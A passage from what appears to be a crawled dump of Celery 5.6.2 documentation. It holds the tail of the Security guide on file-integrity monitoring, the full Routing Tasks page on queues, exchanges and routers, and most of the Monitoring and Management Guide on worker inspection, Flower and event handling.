tool, with several open source implementations, used to keep cryptographic hashes of files in the file-system, so that administrators can be alerted when they change. This way when the damage is done and your system has been compromised you can tell exactly what files intruders have changed (password files, logs, back-doors, root-kits, and so on). Often this is the only way you’ll be able to detect an intrusion.\n\nSome open source implementations include:\n\nOSSEC\n\nSamhain\n\nOpen Source Tripwire\n\nAIDE\n\nAlso, the ZFS file-system comes with built-in integrity checks that can be used.\n\nFootnotes\n\n[*]\n\nhttps://blog.nelhage.com/2011/03/exploiting-pickle/\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nMonitoring and Management Guide\n\nNext topic\n\nOptimizing\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Security\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491574,
    "timestamp": "2026-02-23T00:13:49.322Z",
    "title": "Routing Tasks — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/routing.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Routing Tasks\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nRouting Tasks\n\nNote\n\nAlternate routing concepts like topic and fanout is not available for all transports, please consult the transport comparison table.\n\nBasics\n\nAutomatic routing\n\nChanging the name of the default queue\n\nHow the queues are defined\n\nManual routing\n\nSpecial Routing Options\n\nRabbitMQ Message Priorities\n\nRedis Message Priorities\n\nAMQP Primer\n\nMessages\n\nProducers, consumers, and brokers\n\nExchanges, queues, and routing keys\n\nExchange types\n\nDirect exchanges\n\nTopic exchanges\n\nRelated API commands\n\nHands-on with the API\n\nRouting Tasks\n\nDefining queues\n\nSpecifying task destination\n\nRouters\n\nBroadcast\n\nBasics\nAutomatic routing\n\nThe simplest way to do routing is to use the task_create_missing_queues setting (on by default).\n\nWith this setting on, a named queue that’s not already defined in task_queues will be created automatically. This makes it easy to perform simple routing tasks.\n\nSay you have two servers, x, and y that handle regular tasks, and one server z, that only handles feed related tasks. You can use this configuration:\n\ntask_routes = {'feed.tasks.import_feed': {'queue': 'feeds'}}\n\n\nWith this route enabled import feed tasks will be routed to the “feeds” queue, while all other tasks will be routed to the default queue (named “celery” for historical reasons).\n\nAlternatively, you can use glob pattern matching, or even regular expressions, to match all tasks in the feed.tasks name-space:\n\napp.conf.task_routes = {'feed.tasks.*': {'queue': 'feeds'}}\n\n\nIf the order of matching patterns is important you should specify the router in items format instead:\n\ntask_routes = ([\n    ('feed.tasks.*', {'queue': 'feeds'}),\n    ('web.tasks.*', {'queue': 'web'}),\n    (re.compile(r'(video|image)\\.tasks\\..*'), {'queue': 'media'}),\n],)\n\n\nNote\n\nThe task_routes setting can either be a dictionary, or a list of router objects, so in this case we need to specify the setting as a tuple containing a list.\n\nAfter installing the router, you can start server z to only process the feeds queue like this:\n\nuser@z:/$ celery -A proj worker -Q feeds\n\n\nYou can specify as many queues as you want, so you can make this server process the default queue as well:\n\nuser@z:/$ celery -A proj worker -Q feeds,celery\n\nChanging the name of the default queue\n\nYou can change the name of the default queue by using the following configuration:\n\napp.conf.task_default_queue = 'default'\n\nHow the queues are defined\n\nThe point with this feature is to hide the complex AMQP protocol for users with only basic needs. However – you may still be interested in how these queues are declared.\n\nA queue named “video” will be created with the following settings:\n\n{'exchange': 'video',\n 'exchange_type': 'direct',\n 'routing_key': 'video'}\n\n\nThe non-AMQP backends like Redis or SQS don’t support exchanges, so they require the exchange to have the same name as the queue. Using this design ensures it will work for them as well.\n\nManual routing\n\nSay you have two servers, x, and y that handle regular tasks, and one server z, that only handles feed related tasks, you can use this configuration:\n\nfrom kombu import Queue\n\napp.conf.task_default_queue = 'default'\napp.conf.task_queues = (\n    Queue('default',    routing_key='task.#'),\n    Queue('feed_tasks', routing_key='feed.#'),\n)\napp.conf.task_default_exchange = 'tasks'\napp.conf.task_default_exchange_type = 'topic'\napp.conf.task_default_routing_key = 'task.default'\n\n\ntask_queues is a list of Queue instances. If you don’t set the exchange or exchange type values for a key, these will be taken from the task_default_exchange and task_default_exchange_type settings.\n\nTo route a task to the feed_tasks queue, you can add an entry in the task_routes setting:\n\ntask_routes = {\n        'feeds.tasks.import_feed': {\n            'queue': 'feed_tasks',\n            'routing_key': 'feed.import',\n        },\n}\n\n\nYou can also override this using the routing_key argument to Task.apply_async(), or send_task():\n\n>>> from feeds.tasks import import_feed\n>>> import_feed.apply_async(args=['http://cnn.com/rss'],\n...                         queue='feed_tasks',\n...                         routing_key='feed.import')\n\n\nTo make server z consume from the feed queue exclusively you can start it with the celery worker -Q option:\n\nuser@z:/$ celery -A proj worker -Q feed_tasks --hostname=z@%h\n\n\nServers x and y must be configured to consume from the default queue:\n\nuser@x:/$ celery -A proj worker -Q default --hostname=x@%h\nuser@y:/$ celery -A proj worker -Q default --hostname=y@%h\n\n\nIf you want, you can even have your feed processing worker handle regular tasks as well, maybe in times when there’s a lot of work to do:\n\nuser@z:/$ celery -A proj worker -Q feed_tasks,default --hostname=z@%h\n\n\nIf you have another queue but on another exchange you want to add, just specify a custom exchange and exchange type:\n\nfrom kombu import Exchange, Queue\n\napp.conf.task_queues = (\n    Queue('feed_tasks',    routing_key='feed.#'),\n    Queue('regular_tasks', routing_key='task.#'),\n    Queue('image_tasks',   exchange=Exchange('mediatasks', type='direct'),\n                           routing_key='image.compress'),\n)\n\n\nIf you’re confused about these terms, you should read up on AMQP.\n\nSee also\n\nIn addition to the Redis Message Priorities below, there’s Rabbits and Warrens, an excellent blog post describing queues and exchanges. There’s also The CloudAMQP tutorial, For users of RabbitMQ the RabbitMQ FAQ could be useful as a source of information.\n\nSpecial Routing Options\nRabbitMQ Message Priorities\nsupported transports:\n\nRabbitMQ\n\nAdded in version 4.0.\n\nQueues can be configured to support priorities by setting the x-max-priority argument:\n\nfrom kombu import Exchange, Queue\n\napp.conf.task_queues = [\n    Queue('tasks', Exchange('tasks'), routing_key='tasks',\n          queue_arguments={'x-max-priority': 10}),\n]\n\n\nA default value for all queues can be set using the task_queue_max_priority setting:\n\napp.conf.task_queue_max_priority = 10\n\n\nA default priority for all tasks can also be specified using the task_default_priority setting:\n\napp.conf.task_default_priority = 5\n\nRedis Message Priorities\nsupported transports:\n\nRedis\n\nWhile the Celery Redis transport does honor the priority field, Redis itself has no notion of priorities. Please read this note before attempting to implement priorities with Redis as you may experience some unexpected behavior.\n\nTo start scheduling tasks based on priorities you need to configure queue_order_strategy transport option.\n\napp.conf.broker_transport_options = {\n    'queue_order_strategy': 'priority',\n}\n\n\nThe priority support is implemented by creating n lists for each queue. This means that even though there are 10 (0-9) priority levels, these are consolidated into 4 levels by default to save resources. This means that a queue named celery will really be split into 4 queues.\n\nThe highest priority queue will be named celery, and the the other queues will have a separator (by default x06x16) and their priority number appended to the queue name.\n\n['celery', 'celery\\x06\\x163', 'celery\\x06\\x166', 'celery\\x06\\x169']\n\n\nIf you want more priority levels or a different separator you can set the priority_steps and sep transport options:\n\napp.conf.broker_transport_options = {\n    'priority_steps': list(range(10)),\n    'sep': ':',\n    'queue_order_strategy': 'priority',\n}\n\n\nThe config above will give you these queue names:\n\n['celery', 'celery:1', 'celery:2', 'celery:3', 'celery:4', 'celery:5', 'celery:6', 'celery:7', 'celery:8', 'celery:9']\n\n\nThat said, note that this will never be as good as priorities implemented at the broker server level, and may be approximate at best. But it may still be good enough for your application.\n\nAMQP Primer\nMessages\n\nA message consists of headers and a body. Celery uses headers to store the content type of the message and its content encoding. The content type is usually the serialization format used to serialize the message. The body contains the name of the task to execute, the task id (UUID), the arguments to apply it with and some additional meta-data – like the number of retries or an ETA.\n\nThis is an example task message represented as a Python dictionary:\n\n{'task': 'myapp.tasks.add',\n 'id': '54086c5e-6193-4575-8308-dbab76798756',\n 'args': [4, 4],\n 'kwargs': {}}\n\nProducers, consumers, and brokers\n\nThe client sending messages is typically called a publisher, or a producer, while the entity receiving messages is called a consumer.\n\nThe broker is the message server, routing messages from producers to consumers.\n\nYou’re likely to see these terms used a lot in AMQP related material.\n\nExchanges, queues, and routing keys\n\nMessages are sent to exchanges.\n\nAn exchange routes messages to one or more queues. Several exchange types exists, providing different ways to do routing, or implementing different messaging scenarios.\n\nThe message waits in the queue until someone consumes it.\n\nThe message is deleted from the queue when it has been acknowledged.\n\nThe steps required to send and receive messages are:\n\nCreate an exchange\n\nCreate a queue\n\nBind the queue to the exchange.\n\nCelery automatically creates the entities necessary for the queues in task_queues to work (except if the queue’s auto_declare setting is set to False).\n\nHere’s an example queue configuration with three queues; One for video, one for images, and one default queue for everything else:\n\nfrom kombu import Exchange, Queue\n\napp.conf.task_queues = (\n    Queue('default', Exchange('default'), routing_key='default'),\n    Queue('videos',  Exchange('media'),   routing_key='media.video'),\n    Queue('images',  Exchange('media'),   routing_key='media.image'),\n)\napp.conf.task_default_queue = 'default'\napp.conf.task_default_exchange_type = 'direct'\napp.conf.task_default_routing_key = 'default'\n\nExchange types\n\nThe exchange type defines how the messages are routed through the exchange. The exchange types defined in the standard are direct, topic, fanout and headers. Also non-standard exchange types are available as plug-ins to RabbitMQ, like the last-value-cache plug-in by Michael Bridgen.\n\nDirect exchanges\n\nDirect exchanges match by exact routing keys, so a queue bound by the routing key video only receives messages with that routing key.\n\nTopic exchanges\n\nTopic exchanges matches routing keys using dot-separated words, and the wild-card characters: * (matches a single word), and # (matches zero or more words).\n\nWith routing keys like usa.news, usa.weather, norway.news, and norway.weather, bindings could be *.news (all news), usa.# (all items in the USA), or usa.weather (all USA weather items).\n\nRelated API commands\nexchange.declare(exchange_name, type, passive,\ndurable, auto_delete, internal)\n\nDeclares an exchange by name.\n\nSee amqp:Channel.exchange_declare.\n\nKeyword Arguments:\n\npassive – Passive means the exchange won’t be created, but you can use this to check if the exchange already exists.\n\ndurable – Durable exchanges are persistent (i.e., they survive a broker restart).\n\nauto_delete – This means the exchange will be deleted by the broker when there are no more queues using it.\n\nqueue.declare(queue_name, passive, durable, exclusive, auto_delete)\n\nDeclares a queue by name.\n\nSee amqp:Channel.queue_declare\n\nExclusive queues can only be consumed from by the current connection. Exclusive also implies auto_delete.\n\nqueue.bind(queue_name, exchange_name, routing_key)\n\nBinds a queue to an exchange with a routing key.\n\nUnbound queues won’t receive messages, so this is necessary.\n\nSee amqp:Channel.queue_bind\n\nqueue.delete(name, if_unused=False, if_empty=False)\n\nDeletes a queue and its binding.\n\nSee amqp:Channel.queue_delete\n\nexchange.delete(name, if_unused=False)\n\nDeletes an exchange.\n\nSee amqp:Channel.exchange_delete\n\nNote\n\nDeclaring doesn’t necessarily mean “create”. When you declare you assert that the entity exists and that it’s operable. There’s no rule as to whom should initially create the exchange/queue/binding, whether consumer or producer. Usually the first one to need it will be the one to create it.\n\nHands-on with the API\n\nCelery comes with a tool called celery amqp that’s used for command line access to the AMQP API, enabling access to administration tasks like creating/deleting queues and exchanges, purging queues or sending messages. It can also be used for non-AMQP brokers, but different implementation may not implement all commands.\n\nYou can write commands directly in the arguments to celery amqp, or just start with no arguments to start it in shell-mode:\n\n$ celery -A proj amqp\n-> connecting to amqp://guest@localhost:5672/.\n-> connected.\n1>\n\n\nHere 1> is the prompt. The number 1, is the number of commands you have executed so far. Type help for a list of commands available. It also supports auto-completion, so you can start typing a command and then hit the tab key to show a list of possible matches.\n\nLet’s create a queue you can send messages to:\n\n$ celery -A proj amqp\n1> exchange.declare testexchange direct\nok.\n2> queue.declare testqueue\nok. queue:testqueue messages:0 consumers:0.\n3> queue.bind testqueue testexchange testkey\nok.\n\n\nThis created the direct exchange testexchange, and a queue named testqueue. The queue is bound to the exchange using the routing key testkey.\n\nFrom now on all messages sent to the exchange testexchange with routing key testkey will be moved to this queue. You can send a message by using the basic.publish command:\n\n4> basic.publish 'This is a message!' testexchange testkey\nok.\n\n\nNow that the message is sent you can retrieve it again. You can use the basic.get command here, that polls for new messages on the queue in a synchronous manner (this is OK for maintenance tasks, but for services you want to use basic.consume instead)\n\nPop a message off the queue:\n\n5> basic.get testqueue\n{'body': 'This is a message!',\n 'delivery_info': {'delivery_tag': 1,\n                   'exchange': u'testexchange',\n                   'message_count': 0,\n                   'redelivered': False,\n                   'routing_key': u'testkey'},\n 'properties': {}}\n\n\nAMQP uses acknowledgment to signify that a message has been received and processed successfully. If the message hasn’t been acknowledged and consumer channel is closed, the message will be delivered to another consumer.\n\nNote the delivery tag listed in the structure above; Within a connection channel, every received message has a unique delivery tag, This tag is used to acknowledge the message. Also note that delivery tags aren’t unique across connections, so in another client the delivery tag 1 might point to a different message than in this channel.\n\nYou can acknowledge the message you received using basic.ack:\n\n6> basic.ack 1\nok.\n\n\nTo clean up after our test session you should delete the entities you created:\n\n7> queue.delete testqueue\nok. 0 messages deleted.\n8> exchange.delete testexchange\nok.\n\nRouting Tasks\nDefining queues\n\nIn Celery available queues are defined by the task_queues setting.\n\nHere’s an example queue configuration with three queues; One for video, one for images, and one default queue for everything else:\n\ndefault_exchange = Exchange('default', type='direct')\nmedia_exchange = Exchange('media', type='direct')\n\napp.conf.task_queues = (\n    Queue('default', default_exchange, routing_key='default'),\n    Queue('videos', media_exchange, routing_key='media.video'),\n    Queue('images', media_exchange, routing_key='media.image')\n)\napp.conf.task_default_queue = 'default'\napp.conf.task_default_exchange = 'default'\napp.conf.task_default_routing_key = 'default'\n\n\nHere, the task_default_queue will be used to route tasks that doesn’t have an explicit route.\n\nThe default exchange, exchange type, and routing key will be used as the default routing values for tasks, and as the default values for entries in task_queues.\n\nMultiple bindings to a single queue are also supported. Here’s an example of two routing keys that are both bound to the same queue:\n\nfrom kombu import Exchange, Queue, binding\n\nmedia_exchange = Exchange('media', type='direct')\n\nCELERY_QUEUES = (\n    Queue('media', [\n        binding(media_exchange, routing_key='media.video'),\n        binding(media_exchange, routing_key='media.image'),\n    ]),\n)\n\nSpecifying task destination\n\nThe destination for a task is decided by the following (in order):\n\nThe routing arguments to Task.apply_async().\n\nRouting related attributes defined on the Task itself.\n\nThe Routers defined in task_routes.\n\nIt’s considered best practice to not hard-code these settings, but rather leave that as configuration options by using Routers; This is the most flexible approach, but sensible defaults can still be set as task attributes.\n\nRouters\n\nA router is a function that decides the routing options for a task.\n\nAll you need to define a new router is to define a function with the signature (name, args, kwargs, options, task=None, **kw):\n\ndef route_task(name, args, kwargs, options, task=None, **kw):\n        if name == 'myapp.tasks.compress_video':\n            return {'exchange': 'video',\n                    'exchange_type': 'topic',\n                    'routing_key': 'video.compress'}\n\n\nIf you return the queue key, it’ll expand with the defined settings of that queue in task_queues:\n\n{'queue': 'video', 'routing_key': 'video.compress'}\n\n\nbecomes –>\n\n{'queue': 'video',\n 'exchange': 'video',\n 'exchange_type': 'topic',\n 'routing_key': 'video.compress'}\n\n\nYou install router classes by adding them to the task_routes setting:\n\ntask_routes = (route_task,)\n\n\nRouter functions can also be added by name:\n\ntask_routes = ('myapp.routers.route_task',)\n\n\nFor simple task name -> route mappings like the router example above, you can simply drop a dict into task_routes to get the same behavior:\n\ntask_routes = {\n    'myapp.tasks.compress_video': {\n        'queue': 'video',\n        'routing_key': 'video.compress',\n    },\n}\n\n\nThe routers will then be traversed in order, it will stop at the first router returning a true value, and use that as the final route for the task.\n\nYou can also have multiple routers defined in a sequence:\n\ntask_routes = [\n    route_task,\n    {\n        'myapp.tasks.compress_video': {\n            'queue': 'video',\n            'routing_key': 'video.compress',\n    },\n]\n\n\nThe routers will then be visited in turn, and the first to return a value will be chosen.\n\nIf you're using Redis or RabbitMQ you can also specify the queue's default priority in the route.\n\ntask_routes = {\n    'myapp.tasks.compress_video': {\n        'queue': 'video',\n        'routing_key': 'video.compress',\n        'priority': 10,\n    },\n}\n\n\nSimilarly, calling apply_async on a task will override that default priority.\n\ntask.apply_async(priority=0)\n\n\nPriority Order and Cluster Responsiveness\n\nIt is important to note that, due to worker prefetching, if a bunch of tasks submitted at the same time they may be out of priority order at first. Disabling worker prefetching will prevent this issue, but may cause less than ideal performance for small, fast tasks. In most cases, simply reducing worker_prefetch_multiplier to 1 is an easier and cleaner way to increase the responsiveness of your system without the costs of disabling prefetching entirely.\n\nNote that priorities values are sorted in reverse when using the redis broker: 0 being highest priority.\n\nBroadcast\n\nCelery can also support broadcast routing. Here is an example exchange broadcast_tasks that delivers copies of tasks to all workers connected to it:\n\nfrom kombu.common import Broadcast\n\napp.conf.task_queues = (Broadcast('broadcast_tasks'),)\napp.conf.task_routes = {\n    'tasks.reload_cache': {\n        'queue': 'broadcast_tasks',\n        'exchange': 'broadcast_tasks'\n    }\n}\n\n\nNow the tasks.reload_cache task will be sent to every worker consuming from this queue.\n\nHere is another example of broadcast routing, this time with a celery beat schedule:\n\nfrom kombu.common import Broadcast\nfrom celery.schedules import crontab\n\napp.conf.task_queues = (Broadcast('broadcast_tasks'),)\n\napp.conf.beat_schedule = {\n    'test-task': {\n        'task': 'tasks.reload_cache',\n        'schedule': crontab(minute=0, hour='*/3'),\n        'options': {'exchange': 'broadcast_tasks'}\n    },\n}\n\n\nBroadcast & Results\n\nNote that Celery result doesn’t define what happens if two tasks have the same task_id. If the same task is distributed to more than one worker, then the state history may not be preserved.\n\nIt’s a good idea to set the task.ignore_result attribute in this case.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nPeriodic Tasks\n\nNext topic\n\nMonitoring and Management Guide\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Routing Tasks\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491575,
    "timestamp": "2026-02-23T00:13:49.322Z",
    "title": "Monitoring and Management Guide — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/monitoring.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Monitoring and Management Guide\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nMonitoring and Management Guide\n\nIntroduction\n\nWorkers\n\nManagement Command-line Utilities (inspect/control)\n\nCommands\n\nSpecifying destination nodes\n\nFlower: Real-time Celery web-monitor\n\nFeatures\n\nUsage\n\ncelery events: Curses Monitor\n\nRabbitMQ\n\nInspecting queues\n\nRedis\n\nInspecting queues\n\nMunin\n\nEvents\n\nSnapshots\n\nCustom Camera\n\nReal-time processing\n\nEvent Reference\n\nTask Events\n\ntask-sent\n\ntask-received\n\ntask-started\n\ntask-succeeded\n\ntask-failed\n\ntask-rejected\n\ntask-revoked\n\ntask-retried\n\nWorker Events\n\nworker-online\n\nworker-heartbeat\n\nworker-offline\n\nMailbox Configuration (Advanced)\n\nIntroduction\n\nThere are several tools available to monitor and inspect Celery clusters.\n\nThis document describes some of these, as well as features related to monitoring, like events and broadcast commands.\n\nWorkers\nManagement Command-line Utilities (inspect/control)\n\ncelery can also be used to inspect and manage worker nodes (and to some degree tasks).\n\nTo list all the commands available do:\n\n$ celery --help\n\n\nor to get help for a specific command do:\n\n$ celery <command> --help\n\nCommands\n\nshell: Drop into a Python shell.\n\nThe locals will include the celery variable: this is the current app. Also all known tasks will be automatically added to locals (unless the --without-tasks flag is set).\n\nUses https://pypi.org/project/Ipython/, https://pypi.org/project/bpython/, or regular python in that order if installed. You can force an implementation using --ipython, --bpython, or --python.\n\nstatus: List active nodes in this cluster\n\n$ celery -A proj status\n\n\nresult: Show the result of a task\n\n$ celery -A proj result -t tasks.add 4e196aa4-0141-4601-8138-7aa33db0f577\n\n\nNote that you can omit the name of the task as long as the task doesn’t use a custom result backend.\n\npurge: Purge messages from all configured task queues.\n\nThis command will remove all messages from queues configured in the CELERY_QUEUES setting:\n\nWarning\n\nThere’s no undo for this operation, and messages will be permanently deleted!\n\n$ celery -A proj purge\n\n\nYou can also specify the queues to purge using the -Q option:\n\n$ celery -A proj purge -Q celery,foo,bar\n\n\nand exclude queues from being purged using the -X option:\n\n$ celery -A proj purge -X celery\n\n\ninspect active: List active tasks\n\n$ celery -A proj inspect active\n\n\nThese are all the tasks that are currently being executed.\n\ninspect scheduled: List scheduled ETA tasks\n\n$ celery -A proj inspect scheduled\n\n\nThese are tasks reserved by the worker when they have an eta or countdown argument set.\n\ninspect reserved: List reserved tasks\n\n$ celery -A proj inspect reserved\n\n\nThis will list all tasks that have been prefetched by the worker, and is currently waiting to be executed (doesn’t include tasks with an ETA value set).\n\ninspect revoked: List history of revoked tasks\n\n$ celery -A proj inspect revoked\n\n\ninspect registered: List registered tasks\n\n$ celery -A proj inspect registered\n\n\ninspect stats: Show worker statistics (see Statistics)\n\n$ celery -A proj inspect stats\n\n\ninspect query_task: Show information about task(s) by id.\n\nAny worker having a task in this set of ids reserved/active will respond with status and information.\n\n$ celery -A proj inspect query_task e9f6c8f0-fec9-4ae8-a8c6-cf8c8451d4f8\n\n\nYou can also query for information about multiple tasks:\n\n$ celery -A proj inspect query_task id1 id2 ... idN\n\n\ncontrol enable_events: Enable events\n\n$ celery -A proj control enable_events\n\n\ncontrol disable_events: Disable events\n\n$ celery -A proj control disable_events\n\n\nmigrate: Migrate tasks from one broker to another (EXPERIMENTAL).\n\n$ celery -A proj migrate redis://localhost amqp://localhost\n\n\nThis command will migrate all the tasks on one broker to another. As this command is new and experimental you should be sure to have a backup of the data before proceeding.\n\nNote\n\nAll inspect and control commands supports a --timeout argument, This is the number of seconds to wait for responses. You may have to increase this timeout if you’re not getting a response due to latency.\n\nSpecifying destination nodes\n\nBy default the inspect and control commands operates on all workers. You can specify a single, or a list of workers by using the --destination argument:\n\n$ celery -A proj inspect -d w1@e.com,w2@e.com reserved\n\n$ celery -A proj control -d w1@e.com,w2@e.com enable_events\n\nFlower: Real-time Celery web-monitor\n\nFlower is a real-time web based monitor and administration tool for Celery. It’s under active development, but is already an essential tool. Being the recommended monitor for Celery, it obsoletes the Django-Admin monitor, celerymon and the ncurses based monitor.\n\nFlower is pronounced like “flow”, but you can also use the botanical version if you prefer.\n\nFeatures\n\nReal-time monitoring using Celery Events\n\nTask progress and history\n\nAbility to show task details (arguments, start time, run-time, and more)\n\nGraphs and statistics\n\nRemote Control\n\nView worker status and statistics\n\nShutdown and restart worker instances\n\nControl worker pool size and autoscale settings\n\nView and modify the queues a worker instance consumes from\n\nView currently running tasks\n\nView scheduled tasks (ETA/countdown)\n\nView reserved and revoked tasks\n\nApply time and rate limits\n\nConfiguration viewer\n\nRevoke or terminate tasks\n\nHTTP API\n\nList workers\n\nShut down a worker\n\nRestart worker’s pool\n\nGrow worker’s pool\n\nShrink worker’s pool\n\nAutoscale worker pool\n\nStart consuming from a queue\n\nStop consuming from a queue\n\nList tasks\n\nList (seen) task types\n\nGet a task info\n\nExecute a task\n\nExecute a task by name\n\nGet a task result\n\nChange soft and hard time limits for a task\n\nChange rate limit for a task\n\nRevoke a task\n\nOpenID authentication\n\nScreenshots\n\nMore screenshots:\n\nUsage\n\nYou can use pip to install Flower:\n\n$ pip install flower\n\n\nRunning the flower command will start a web-server that you can visit:\n\n$ celery -A proj flower\n\n\nThe default port is http://localhost:5555, but you can change this using the –port argument:\n\n$ celery -A proj flower --port=5555\n\n\nBroker URL can also be passed through the --broker argument :\n\n$ celery --broker=amqp://guest:guest@localhost:5672// flower\nor\n$ celery --broker=redis://guest:guest@localhost:6379/0 flower\n\n\nThen, you can visit flower in your web browser :\n\n$ open http://localhost:5555\n\n\nFlower has many more features than are detailed here, including authorization options. Check out the official documentation for more information.\n\ncelery events: Curses Monitor\n\nAdded in version 2.0.\n\ncelery events is a simple curses monitor displaying task and worker history. You can inspect the result and traceback of tasks, and it also supports some management commands like rate limiting and shutting down workers. This monitor was started as a proof of concept, and you probably want to use Flower instead.\n\nStarting:\n\n$ celery -A proj events\n\n\nYou should see a screen like:\n\ncelery events is also used to start snapshot cameras (see Snapshots:\n\n$ celery -A proj events --camera=<camera-class> --frequency=1.0\n\n\nand it includes a tool to dump events to stdout:\n\n$ celery -A proj events --dump\n\n\nFor a complete list of options use --help:\n\n$ celery events --help\n\nRabbitMQ\n\nTo manage a Celery cluster it is important to know how RabbitMQ can be monitored.\n\nRabbitMQ ships with the rabbitmqctl(1) command, with this you can list queues, exchanges, bindings, queue lengths, the memory usage of each queue, as well as manage users, virtual hosts and their permissions.\n\nNote\n\nThe default virtual host (\"/\") is used in these examples, if you use a custom virtual host you have to add the -p argument to the command, for example: rabbitmqctl list_queues -p my_vhost …\n\nInspecting queues\n\nFinding the number of tasks in a queue:\n\n$ rabbitmqctl list_queues name messages messages_ready \\\n                          messages_unacknowledged\n\n\nHere messages_ready is the number of messages ready for delivery (sent but not received), messages_unacknowledged is the number of messages that’s been received by a worker but not acknowledged yet (meaning it is in progress, or has been reserved). messages is the sum of ready and unacknowledged messages.\n\nFinding the number of workers currently consuming from a queue:\n\n$ rabbitmqctl list_queues name consumers\n\n\nFinding the amount of memory allocated to a queue:\n\n$ rabbitmqctl list_queues name memory\n\nTip:\n\nAdding the -q option to rabbitmqctl(1) makes the output easier to parse.\n\nRedis\n\nIf you’re using Redis as the broker, you can monitor the Celery cluster using the redis-cli(1) command to list lengths of queues.\n\nInspecting queues\n\nFinding the number of tasks in a queue:\n\n$ redis-cli -h HOST -p PORT -n DATABASE_NUMBER llen QUEUE_NAME\n\n\nThe default queue is named celery. To get all available queues, invoke:\n\n$ redis-cli -h HOST -p PORT -n DATABASE_NUMBER keys \\*\n\n\nNote\n\nQueue keys only exists when there are tasks in them, so if a key doesn’t exist it simply means there are no messages in that queue. This is because in Redis a list with no elements in it is automatically removed, and hence it won’t show up in the keys command output, and llen for that list returns 0.\n\nAlso, if you’re using Redis for other purposes, the output of the keys command will include unrelated values stored in the database. The recommended way around this is to use a dedicated DATABASE_NUMBER for Celery, you can also use database numbers to separate Celery applications from each other (virtual hosts), but this won’t affect the monitoring events used by for example Flower as Redis pub/sub commands are global rather than database based.\n\nMunin\n\nThis is a list of known Munin plug-ins that can be useful when maintaining a Celery cluster.\n\nrabbitmq-munin: Munin plug-ins for RabbitMQ.\n\nhttps://github.com/ask/rabbitmq-munin\n\ncelery_tasks: Monitors the number of times each task type has been executed (requires celerymon).\n\nhttps://github.com/munin-monitoring/contrib/blob/master/plugins/celery/celery_tasks\n\ncelery_tasks_states: Monitors the number of tasks in each state (requires celerymon).\n\nhttps://github.com/munin-monitoring/contrib/blob/master/plugins/celery/celery_tasks_states\n\nEvents\n\nThe worker has the ability to send a message whenever some event happens. These events are then captured by tools like Flower, and celery events to monitor the cluster.\n\nSnapshots\n\nAdded in version 2.1.\n\nEven a single worker can produce a huge amount of events, so storing the history of all events on disk may be very expensive.\n\nA sequence of events describes the cluster state in that time period, by taking periodic snapshots of this state you can keep all history, but still only periodically write it to disk.\n\nTo take snapshots you need a Camera class, with this you can define what should happen every time the state is captured; You can write it to a database, send it by email or something else entirely.\n\ncelery events is then used to take snapshots with the camera, for example if you want to capture state every 2 seconds using the camera myapp.Camera you run celery events with the following arguments:\n\n$ celery -A proj events -c myapp.Camera --frequency=2.0\n\nCustom Camera\n\nCameras can be useful if you need to capture events and do something with those events at an interval. For real-time event processing you should use app.events.Receiver directly, like in Real-time processing.\n\nHere is an example camera, dumping the snapshot to screen:\n\nfrom pprint import pformat\n\nfrom celery.events.snapshot import Polaroid\n\nclass DumpCam(Polaroid):\n    clear_after = True  # clear after flush (incl, state.event_count).\n\n    def on_shutter(self, state):\n        if not state.event_count:\n            # No new events since last snapshot.\n            return\n        print('Workers: {0}'.format(pformat(state.workers, indent=4)))\n        print('Tasks: {0}'.format(pformat(state.tasks, indent=4)))\n        print('Total: {0.event_count} events, {0.task_count} tasks'.format(\n            state))\n\n\nSee the API reference for celery.events.state to read more about state objects.\n\nNow you can use this cam with celery events by specifying it with the -c option:\n\n$ celery -A proj events -c myapp.DumpCam --frequency=2.0\n\n\nOr you can use it programmatically like this:\n\nfrom celery import Celery\nfrom myapp import DumpCam\n\ndef main(app, freq=1.0):\n    state = app.events.State()\n    with app.connection() as connection:\n        recv = app.events.Receiver(connection, handlers={'*': state.event})\n        with DumpCam(state, freq=freq):\n            recv.capture(limit=None, timeout=None)\n\nif __name__ == '__main__':\n    app = Celery(broker='amqp://guest@localhost//')\n    main(app)\n\nReal-time processing\n\nTo process events in real-time you need the following\n\nAn event consumer (this is the Receiver)\n\nA set of handlers called when events come in.\n\nYou can have different handlers for each event type, or a catch-all handler can be used (‘*’)\n\nState (optional)\n\napp.events.State is a convenient in-memory representation of tasks and workers in the cluster that’s updated as events come in.\n\nIt encapsulates solutions for many common things, like checking if a worker is still alive (by verifying heartbeats), merging event fields together as events come in, making sure time-stamps are in sync, and so on.\n\nCombining these you can easily process events in real-time:\n\nfrom celery import Celery\n\n\ndef my_monitor(app):\n    state = app.events.State()\n\n    def announce_failed_tasks(event):\n        state.event(event)\n        # task name is sent only with -received event, and state\n        # will keep track of this for us.\n        task = state.tasks.get(event['uuid'])\n\n        print('TASK FAILED: %s[%s] %s' % (\n            task.name, task.uuid, task.info(),))\n\n    with app.connection() as connection:\n        recv = app.events.Receiver(connection, handlers={\n                'task-failed': announce_failed_tasks,\n                '*': state.event,\n        })\n        recv.capture(limit=None, timeout=None, wakeup=True)\n\nif __name__ == '__main__':\n    app = Celery(broker='amqp://guest@localhost//')\n    my_monitor(app)\n\n\nNote\n\nThe wakeup argument to capture sends a signal to all workers to force them to send a heartbeat. This way you can immediately see workers when the monitor starts.\n\nYou can listen to specific events by specifying the handlers:\n\nfrom celery import Celery\n\ndef my_monitor(app):\n    state = app.events.State()\n\n    def announce_failed_tasks(event):\n        state.event(event)\n        # task name is sent only with -received event, and state\n        # will keep track of this for us.\n        task = state.tasks.get(event['uuid'])\n\n        print('TASK FAILED: %s[%s] %s' % (\n            task.name, task.uuid, task.info(),))\n\n    with app.connection() as 